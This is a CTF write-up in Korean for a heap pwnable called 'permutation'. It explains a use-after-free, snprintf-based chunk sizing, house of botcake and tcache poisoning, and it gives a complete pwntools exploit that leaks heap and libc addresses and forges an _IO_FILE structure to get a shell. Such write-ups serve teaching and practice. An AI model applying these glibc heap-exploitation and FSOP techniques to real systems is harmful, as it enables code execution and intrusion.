# permutation

  

#### 출제자 : 조수호 / shielder

  

## Concept

  

- UAF, DFB, tcache poisoning, house of botcake

  

## Writeup

  

```bash

    Arch:       amd64-64-little

    RELRO:      Full RELRO

    Stack:      Canary found

    NX:         NX enabled

    PIE:        PIE enabled

    SHSTK:      Enabled

    IBT:        Enabled

```

모든 보호 기법이 켜져 있습니다.

  

이 문제에는 한 개의 숨겨진 함수를 포함한 4개의 함수와 종료 기능이 있습니다. note challenge의 형식을 띄고 있습니다. 인덱스는 0 이상 32 미만으로 관리하고 있으며 `oob`는 발생하지 않고, `stack, heap based overflow`도 발생하지 않습니다.

  

```c

void create(){

    unsigned int idx = 0;

    int n = 0;

    char buf[0x204], buf2[0x204];

    char * ptr = NULL;

    memset(buf, 0, sizeof(buf));

    memset(buf2, 0, sizeof(buf2));

    printf("index : ");

    scanf("%u", &idx);

    if(idx >= 0x20){

        puts("Nope");

        return;

    }

  

    printf("name of food : ");

    read(0, buf, 0xf0);

  

    n = snprintf(buf2, 0x100, "bot_cake submit food name : %s", buf);

    if(n < 0){

        puts("Oops");

        return;

    }

  

    if(foods[idx] != NULL) free(foods[idx]);

    ptr = malloc(n < 0x100 ? 0x100 : n);

    if(ptr == NULL){

        puts("Oops");

        return;

    }

  

    if(!strncmp(buf, "cake", 4)){

        puts("You don't give cake");

        return;

    }

  

    foods[idx] = ptr;

  

    memcpy(ptr, buf2, n + 1);

}

```

1번 메뉴에서 코드의 흐름을 보시면, `free` -> `malloc` -> `condition check` -> `substitution` 로 이루어져 있습니다. 이 때 `condition check`를 실패하면, 대입이 이루어지지 않아 `UAF`가 발생합니다.

이 문제에 `edit` 함수가 없기 때문에 `tcache poisoning`을 위해 다른 방법을 강구해야 합니다. 이 문제의 제목에서 [`house of botcake`](https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_botcake.c) 기법을 떠올릴 수 있습니다. 기법에 대한 설명은 `how2heap`의 poc 코드(house_of_botcake.c)로 대체하겠습니다. `house of botcake`를 위해서는 두 가지 크기의 청크를 할당받을 수 있어야 합니다. 이 문제에서 청크의 크기를 아래와 같이 설정하고 있습니다.

```c

n = snprintf(buf2, 0x100, "bot_cake submit food name : %s", buf);

ptr = malloc(n < 0x100 ? 0x100 : n);

```

이 때 `snprintf`의 반환값은 실제 저장된 수가 리턴되는 것이 아니라, 버퍼가 충분한 상황에서의 출력된 문자 수가 리턴됩니다. 따라서 n은 0x109 이상의 값을 가질 수 있기 때문에 0x110, 0x120의 크기를 가지는 청크를 할당할 수 있습니다. 이를 이용하여 FSOP를 진행하여 쉘을 따냅니다.

  

## ex.py

  

```python

from pwn import *

  

binary = './prob'

context.binary = binary

context.arch = 'amd64'

# context.log_level = 'debug'

context.terminal = ['tmux', 'splitw', '-h']

  

p = remote("localhost", 8010)

#p = process(binary)

l = ELF('./libc.so.6')

  

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,

                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,

                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,

                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,

                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,

                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)

    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)

    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)

    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)

    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)

    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)

    FSOP += p64(__pad5) + p32(_mode)

    if _unused2 == b"":

        FSOP += b"\x00" * 0x14

    else:

        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)

    FSOP += more_append

    return FSOP

  

def create(idx : int,  ctt : bytes):

    p.sendlineafter(b'> ', b'1')

    p.sendlineafter(b': ', str(idx).encode())

    p.sendafter(b': ', ctt)

  

def read(idx : int):

    p.sendlineafter(b'> ', b'2')

    p.sendlineafter(b': ', str(idx).encode())

    return p.recvline()

  

def delete(idx : int):

    p.sendlineafter(b'> ', b'3')

    p.sendlineafter(b': ', str(idx).encode())

def edit(idx : int,  ctt : bytes):

    p.sendlineafter(b'> ', str(0x1337).encode())

    p.sendlineafter(b': ', str(idx).encode())

    p.sendafter(b': ', ctt)

  

prefix = b'bot_cake submit food name : '

  

for i in range(11):

    create(i, b'a' * 0xf0)

for i in range(7):

    create(i, b'cake')

create(7, b'cake')

  

heap_base = u64(read(0)[:5].ljust(8, b'\x00')) << 12

assert (heap_base >> 44) == 0x5 or (heap_base >> 44) == 0x6 # if the exploit fails here, just restart

print(hex(heap_base))

  
  

l.address = u64(read(7)[:6].ljust(8, b'\x00')) - 0x21adf0

assert (l.address >> 44) == 0x7 # if the exploit fails here, just restart

print(hex(l.address))

  

print(hex(l.sym['_IO_2_1_stderr_']))

fake_fsop_struct = l.sym['_IO_2_1_stderr_']

stderr_lock = l.address + 0x21ca70

FSOP = FSOP_struct(

    flags=u64(b"\x01\x01\x01\x01;sh\x00"),

    lock=stderr_lock,

    _wide_data=fake_fsop_struct - 0x10,

    _markers=l.symbols["system"],

    _unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),

    vtable=l.symbols["_IO_wfile_jumps"] - 0x40,

    _mode=0xFFFFFFFF,

)

  

delete(7)

delete(8)

delete(9)

create(10, b'cake')

create(11, b'a' * 0xf0)

delete(10)

create(12, b'a')

create(13, b'a')

create(14, b'a' * (0x28 - len(prefix)) + b'b' * 8 + p64((fake_fsop_struct) ^ (heap_base >> 12)))

for i in range(7, 2, -1):

    delete(14)

    create(14, b'a' * (0x28 - len(prefix)) + b'a' * i)

delete(14)

create(14, b'a' * (0x28 - len(prefix)) + p64(0x121))

create(15, b'a' * 0xf0)

edit(0x110, FSOP)

p.interactive()

```